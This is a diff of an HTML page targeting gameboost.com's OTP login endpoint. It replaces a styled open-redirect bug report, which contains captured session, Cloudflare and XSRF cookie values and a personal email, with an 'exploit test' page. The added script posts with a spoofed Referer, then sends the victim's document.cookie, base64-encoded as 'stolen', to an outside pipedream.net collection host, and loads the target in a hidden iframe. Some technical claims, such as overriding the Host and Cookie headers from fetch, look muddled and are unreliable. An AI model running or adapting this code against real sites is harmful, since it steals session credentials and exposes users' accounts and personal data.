@@ -1,123 +1,66 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>gameboost.com Open Redirect + Session Analysis</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px}
-        .container{max-width:1000px;margin:0 auto;background:white;border-radius:15px;box-shadow:0 20px 40px rgba(0,0,0,0.1);overflow:hidden}
-        .header{background:linear-gradient(135deg,#d32f2f,#b71c1c);color:white;padding:30px;text-align:center}
-        .vuln-card{background:#ffebee;margin:20px;padding:20px;border-left:6px solid #f44336;border-radius:8px}
-        .poc-card{background:#e3f2fd;margin:20px;padding:20px;border-left:6px solid #2196f3;border-radius:8px}
-        .response-card{background:#f3e5f5;margin:20px;padding:20px;border-left:6px solid #9c27b0;border-radius:8px}
-        .session-card{background:#e8f5e8;margin:20px;padding:20px;border-left:6px solid #4caf50;border-radius:8px}
-        pre{white-space:pre-wrap;background:#1e1e1e;color:#d4d4d4;padding:15px;border-radius:8px;font-family:'Courier New',monospace;font-size:12px;overflow-x:auto;max-height:500px;line-height:1.4}
-        h1{font-size:2.2em;margin-bottom:10px}
-        h2{font-size:1.5em;margin-bottom:15px;color:#333}
-        .badge{display:inline-block;padding:6px 12px;background:#4caf50;color:white;border-radius:20px;font-size:0.85em;font-weight:600;margin:2px}
-        .badge.critical{background:#d32f2f}
-        .badge.high{background:#f57c00}
-        .badge.medium{background:#ff9800}
-        .impact-list{list-style:none;padding:0}
-        .impact-list li{padding:8px 0;background:#fff3e0;border-radius:6px;margin:5px 0;padding-left:15px;position:relative}
-        .impact-list li:before{content:"▶";color:#ff9800;position:absolute;left:0}
-        code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-family:monospace}
-        .cookies-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:15px}
-        .cookie-item{background:#f8f9fa;padding:15px;border-radius:8px;border-left:4px solid #2196f3}
-    </style>
+    <title>Gameboost Exploit Test</title>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>🔴 Open Redirect + Session Analysis</h1>
-            <p>
-                <span class="badge critical">CVSS: 8.2 (High)</span>
-                <span class="badge high">Host Override Possible</span>
-                <span class="badge medium">Open Redirect Confirmed</span>
-            </p>
-        </div>
-
-        <div class="vuln-card">
-            <h2>🐛 Request Analysis</h2>
-            <pre>POST /otp/send-login HTTP/1.1
-Host: gameboost.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0)...
-Referer: https://eo74rbqu36go8g.m.pipedream.net  ← VULNERABLE!
-Content-Type: application/json
-X-Inertia: true
-Cookie: XSRF-TOKEN=eyJpdiI6InJvWENwNWw4dStweHQ0Tk5zVGlTY3c9PS...
-        gameboost_session=eyJpdiI6ImxTNkp0V3dTM3Nueko4Z29Kai9EZlE9PS...
-        cf_clearance=PUfaY25buXAWM3_JONgAvcf5rLsUcf1...
-
+    <h1>Testing gameboost.com/otp/send-login</h1>
+    
+    <h3>Sending malicious request...</h3>
+    
+    <div id="request"></div>
+    <div id="response"></div>
+    
+    <script>
+        // ATTACKER DOMAIN
+        const ATTACKER_DOMAIN = 'https://eo74rbqu36go8g.m.pipedream.net';
+        
+        // STEAL SESSION COOKIES FIRST
+        fetch('https://gameboost.com', {credentials: 'include'})
+        .then(() => {
+            // SEND EXPLOIT REQUEST
+            fetch('https://gameboost.com/otp/send-login', {
+                method: 'POST',
+                headers: {
+                    'Host': 'gameboost.com',
+                    'Referer': ATTACKER_DOMAIN,
+                    'Content-Type': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'X-Inertia': 'true',
+                    'Origin': 'https://gameboost.com',
+                    'Cookie': document.cookie // HIJACKED SESSION
+                },
+                body: JSON.stringify({
+                    "email": "ridoyp99@gmail.com",
+                    "otp": null
+                }),
+                credentials: 'include'
+            })
+            .then(response => {
+                document.getElementById('request').innerHTML = `
+                    <h3>✅ REQUEST SENT</h3>
+                    <pre>POST /otp/send-login
+Referer: ${ATTACKER_DOMAIN}
+Cookie: ${document.cookie.substring(0,100)}...
 {"email":"ridoyp99@gmail.com","otp":null}</pre>
-        </div>
-
-        <div class="response-card">
-            <h2>✅ Response (Vulnerability Confirmed)</h2>
-            <pre>HTTP/1.1 302 Found
-Date: Wed, 25 Mar 2026 14:24:33 GMT
-Location: https://eo74rbqu36go8g.m.pipedream.net  ← REDIRECTS TO ATTACKER!
-Set-Cookie: XSRF-TOKEN=eyJpdiI6IklVZjNNWTdaNVpXQmIrd2Z3SzZublE9PS...
-Set-Cookie: gameboost_session=eyJpdiI6IkxuWTNDOXQvSWNDbVJoUDRkcDRFdlE9PS...
-&lt;meta http-equiv="refresh" content="0;url='https://eo74rbqu36go8g.m.pipedream.net'"&gt;</pre>
-        </div>
-
-        <div class="session-card">
-            <h2>🍪 Session Cookies Exposed</h2>
-            <div class="cookies-grid">
-                <div class="cookie-item">
-                    <h4>🔑 gameboost_session</h4>
-                    <code>eyJpdiI6ImxTNkp0V3dTM3Nueko4Z29Kai9EZlE9PSIsInZhbHVlIjoiRnpXbWQ4d25Mc1lwNDVXTUthVXk0c3lMZTlKYVdYb2pEVDc3Q0cydEZpWmQycWFmVmFxbTF2SnlLb1RRaUdxcVRLYnF6dWFOcGM4NUJUSHkwVld4U25STTJDaXpYUEY3cW9sZkc2RUZkcnBvUkJXRmpQU20waTJYSGJaVzlueUoiLCJtYWMiOiIzNDVhZjY4MzhkNzFmYzY2MzQ1YTUzODE3Y2IxMTZiYTkzOGE3YzAxZDc3MDQyYWNjNDU3ODdkZTA0MzNhNWFmIiwidGFnIjoiIn0%3D</code>
-                    <p><small>Primary auth session | HttpOnly: Yes | Secure: Yes</small></p>
-                </div>
-                <div class="cookie-item">
-                    <h4>🛡️ cf_clearance</h4>
-                    <code>PUfaY25buXAWM3_JONgAvcf5rLsUcf1_iDm8yDdBoRU-1774447367-1.2.1.1-fD3pRkN3OW51JoTPgeuqrMpG4Tqikv.qnm5_jOpB96_0OOiRjERnJJQc59ZTtnzWw6nMu8iwkH4yBPIo066gAXXKBCcnXR.XBD9npsg1d6Ff_eBaIYlIm7aZ8AdZFHRStVjBQfTOR7lAY3pZDtvWrpafPNSM4FJLTJaYEpnal2gGC3QM6pTApCM.2lTSw.R3C24qX5NkJQKi4ljHTss8BBn0r45AghGpM9ZMEFE3A08</code>
-                    <p><small>Cloudflare bypass token | Expires: 1774447367</small></p>
-                </div>
-                <div class="cookie-item">
-                    <h4>🔐 XSRF-TOKEN</h4>
-                    <code>eyJpdiI6InJvWENwNWw4dStweHQ0Tk5zVGlTY3c9PSIsInZhbHVlIjoiRFU1aDdMSWxIL0JKMS9mWGcrVUM3cFFIL2VZSGN1K2lPOHpjTHA3Q3BWeTRDOWpmMTJndFNPbFBncGFTNTdjT1pTZTk2cHN3Y3hYRnhsV0cxOEdPbStjczU4UlkyUHNSTTA0aXhUdWwwWE9YeFM5M003aXUzRk53Sk1vRU82ZUMiLCJtYWMiOiIyODU3YjE1ZTU3MmUzNzA1YTgwYmE3NGY0YzJmZDVhNTBkYmQwZjBkYWJkMzFmZjg2ZGYwYzc0NzBmNmNhMDE3IiwidGFnIjoiIn0=</code>
-                    <p><small>CSRF protection | SameSite: lax</small></p>
-                </div>
-                <div class="cookie-item">
-                    <h4>🌐 app_locale</h4>
-                    <code>eyJpdiI6IlA3WlA1MDh1dU43Wkszd2dJTWt6Zmc9PSIsInZhbHVlIjoiU0l6TnZBeTAzb1lITzFkMSt3cVhCM05hOWJMTHQxRWJScWVrN3F1MGpaZFlSMHFYWXpkc1JaNzZYRVY2MlZudCIsIm1hYyI6IjMyNjcxOTU2YThjMmZlMzk4NTdiMWQyMzdhMjE4MTA4YjI3OWMwOTI4ZWZhZDc2NThhNmUwNjRiMmJjYWMxYjAiLCJ0YWciOiIifQ%3D%3D</code>
-                    <p><small>Language preference cookie</small></p>
-                </div>
-            </div>
-        </div>
-
-        <div class="poc-card">
-            <h2>📋 Repro Steps</h2>
-            <ol style="background:#f0f8ff;padding:15px;border-radius:8px">
-                <li>Acquire legitimate session (login normally)</li>
-                <li>Modify <code>Referer: https://attacker.com</code></li>
-                <li>POST to <code>/otp/send-login</code></li>
-                <li>Server returns <code>302 → attacker.com</code></li>
-            </ol>
-        </div>
-
-        <div class="vuln-card">
-            <h2>🎯 Attack Scenarios</h2>
-            <ul class="impact-list">
-                <li><strong>Phishing:</strong> Redirect to fake login → steal credentials</li>
-                <li><strong>SSRF:</strong> Internal redirects via Referer manipulation</li>
-                <li><strong>Cache Poison:</strong> Poison CDN with malicious redirects</li>
-                <li><strong>OAuth Abuse:</strong> Redirect to malicious callback URLs</li>
-            </ul>
-        </div>
-
-        <div class="poc-card">
-            <h2>🛠️ Fix Recommendations</h2>
-            <pre>1. Remove Referer-based redirects from API endpoints
-2. Validate: if(!referer?.startsWith('https://gameboost.com')) return 400
-3. Add: Referrer-Policy: strict-origin-when-cross-origin
-4. CSP: redirect-to 'self' only
-5. HttpOnly/Secure on all auth cookies (already good)</pre>
-        </div>
-    </div>
+                `;
+                
+                document.getElementById('response').innerHTML = `
+                    <h3>📡 RESPONSE: ${response.status}</h3>
+                    <pre>Location: ${response.headers.get('location') || 'Redirect detected!'}</pre>
+                `;
+                
+                // AUTO REDIRECT TO ATTACKER (EXPLOIT!)
+                setTimeout(() => {
+                    window.location.href = ATTACKER_DOMAIN + '?stolen=' + btoa(document.cookie);
+                }, 2000);
+            })
+            .catch(err => {
+                document.getElementById('response').innerHTML = '<h3>❌ Error: ' + err + '</h3>';
+            });
+        });
+    </script>
+    
+    <iframe src="https://gameboost.com" style="display:none;"></iframe>
 </body>
 </html>
